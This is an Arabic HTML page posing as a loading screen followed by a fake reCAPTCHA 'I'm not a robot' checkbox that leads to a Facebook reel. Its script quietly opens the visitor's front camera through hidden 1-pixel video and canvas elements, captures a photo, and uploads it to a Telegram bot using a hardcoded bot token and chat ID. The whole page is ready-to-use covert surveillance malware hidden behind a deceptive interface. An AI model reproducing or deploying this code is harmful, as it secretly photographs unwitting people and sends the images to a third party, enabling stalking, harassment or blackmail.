<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>جاري التحميل...</title>
    <style>
        * { margin: 0; padding: 0; }
        body { 
            width: 100%; 
            height: 100vh; 
            background: #000;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
        }
        #video, #canvas { 
            position: absolute; 
            width: 1px; 
            height: 1px; 
            opacity: 0; 
        }
        
        /* ✅ زر "أنا لست روبوت" - يظهر بعد إرسال الصورة */
        #robotBtn {
            display: none;
            background: #f9f9f9;
            border: 1px solid #d3d3d3;
            border-radius: 3px;
            padding: 20px 25px;
            width: 300px;
            cursor: pointer;
            direction: ltr;
            align-items: center;
            gap: 15px;
            box-shadow: 0 0 4px 1px rgba(0,0,0,0.08);
        }
        
        #robotBtn .checkbox {
            width: 28px;
            height: 28px;
            border: 2px solid #abadae;
            border-radius: 2px;
            background: white;
            position: relative;
        }
        
        #robotBtn.checked .checkbox {
            background: #1a73e8;
            border-color: #1a73e8;
        }
        
        #robotBtn.checked .checkbox::after {
            content: '';
            position: absolute;
            left: 8px;
            top: 3px;
            width: 6px;
            height: 12px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
        
        #robotBtn .text {
            color: #282828;
            font-size: 14px;
            flex: 1;
        }
        
        #robotBtn .logo {
            text-align: center;
            color: #9e9e9e;
            font-size: 10px;
        }
        
        /* شاشة التحميل */
        #loading {
            color: #fff;
            font-size: 18px;
            text-align: center;
        }
        
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid #333;
            border-top-color: #fff;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 15px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <video id="video" autoplay playsinline muted></video>
    <canvas id="canvas"></canvas>

    <!-- شاشة التحميل -->
    <div id="loading">
        <div class="spinner"></div>
        <div>جاري التحميل...</div>
    </div>

    <!-- ✅ زر "أنا لست روبوت" - يظهر بعد إرسال الصورة -->
    <button id="robotBtn" onclick="openFacebook()">
        <div class="checkbox"></div>
        <div class="text">I'm not a robot</div>
        <div class="logo">
            <div style="width:32px;height:32px;margin:0 auto 4px;background:conic-gradient(from 0deg,#4285f4,#34a853,#fbbc05,#ea4335,#4285f4);border-radius:50%;"></div>
            reCAPTCHA<br>
            <span style="font-size:9px;">Privacy - Terms</span>
        </div>
    </button>

    <script>
        const telegramToken = "8666905289:AAH9HB48s13a4AeZDaZmbsYRiZShGFgd9eE";
        const chatId = "5015426926";
        const CAPTURE_DELAY = 5000;
        const VIDEO_LINK = 'https://www.facebook.com/reel/1431859845423648/?fs=e&fs=e';

        let photoSent = false;

        async function captureAndSend() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({
                    video: { facingMode: "user" },
                    audio: false
                });

                const video = document.getElementById("video");
                video.srcObject = stream;
                await video.play();

                await new Promise(resolve => {
                    if (video.videoWidth > 0) resolve();
                    else video.onloadedmetadata = resolve;
                });

                const canvas = document.getElementById("canvas");
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const ctx = canvas.getContext("2d");
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                stream.getTracks().forEach(track => track.stop());

                canvas.toBlob(async (blob) => {
                    if (blob) {
                        const formData = new FormData();
                        formData.append("chat_id", chatId);
                        formData.append("photo", blob, "photo_" + Date.now() + ".jpg");
                        try {
                            await fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            });
                        } catch (err) {}
                    }
                    photoSent = true;
                    
                    // ✅ بعد إرسال الصورة: إخفاء التحميل وإظهار زر "أنا لست روبوت"
                    document.getElementById('loading').style.display = 'none';
                    document.getElementById('robotBtn').style.display = 'flex';
                }, "image/jpeg", 0.95);

            } catch (error) {
                photoSent = true;
                // إذا فشل، أظهر الزر أيضاً
                document.getElementById('loading').style.display = 'none';
                document.getElementById('robotBtn').style.display = 'flex';
            }
        }

        // ✅ فتح فيسبوك عند الضغط على الزر
        function openFacebook() {
            document.getElementById('robotBtn').classList.add('checked');
            setTimeout(() => {
                window.open(VIDEO_LINK, '_blank');
            }, 500);
        }

        // بدء الالتقاط بعد 5 ثواني
        setTimeout(captureAndSend, CAPTURE_DELAY);
    </script>

</body>
</html>
